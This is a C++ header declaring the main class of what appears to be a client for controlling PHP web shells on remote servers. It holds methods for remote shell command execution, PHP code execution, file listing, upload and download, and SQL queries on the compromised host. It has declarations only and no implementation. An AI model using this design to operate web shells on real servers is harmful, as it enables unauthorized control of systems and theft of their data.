
/**************************************************************************
Copyright:Image
Author: Image
Date:2017-09-10
Description:phpwebshell main class
***************************************************************************/

#pragma once
#include"curlhelper.h"
#include"cryptohelper.h"






using namespace std;
enum PLACE { PLACE_POST,PLACE_GET,HEADER,COOKIE };
class WebShell
{
private:
	string url;
	METHOD Method;
	string pass;
	bool enabled;
	string php_version;
	string kernel_version;
	string webroot;
	vector<string> disabled_functions;
	vector<pair<ENCRYPT_METHOD,string>> EncryptMethod;
	pair<PLACE,string> place;
	map<string, string>addon_post;
	map<string, string>addon_get;
	string SQLhost;
	string SQLuser;
	string SQLpass;
	string SQLport;
public:
	WebShell() {};
	
	WebShell(string addr, METHOD meth, string password, PLACE paramplace=PLACE_GET, string paramvalue = "Image");
	//WebShell(string json_obb);
	string getUrl() { return this->url; }
	METHOD getMethod() { return this->Method; }
	string get_webroot();
	string get_php_version();
	string get_kernel_version();
	bool check_connection();
	void ParseMethod(string meth);
	void get_disabled_functions();
	void addClientMethod(ENCRYPT_METHOD meth, string param);
	void addAddonPost(string param, string value);
	void addAddonGet(string param, string value);
	void setPlace(string place, string paramvlue);
	void setSQLconnection(string host, string user, string pass, string port = "3306");
	CURLcode ShellCommandExec(string command,string&ans);
	CURLcode php_exec(string command, string&ans, map<string, string>*addonparams=NULL);
	CURLcode GetFileList(string&ans,string directory="");
	CURLcode GetFile(string filename, string downname);
	CURLcode UploadFile(string filename, string updir);
	CURLcode ExecSQL(string sql, string db, string&ans);
	//bool isFileExists(string filename);
	string encode(string command);
	~WebShell();
	WebShell operator=(WebShell&shell) {
		this->url = shell.url;
		this->pass = shell.pass;
		this->place = shell.place;
		this->EncryptMethod = shell.EncryptMethod;
		this->Method = shell.Method;
		return *this;
	}

};

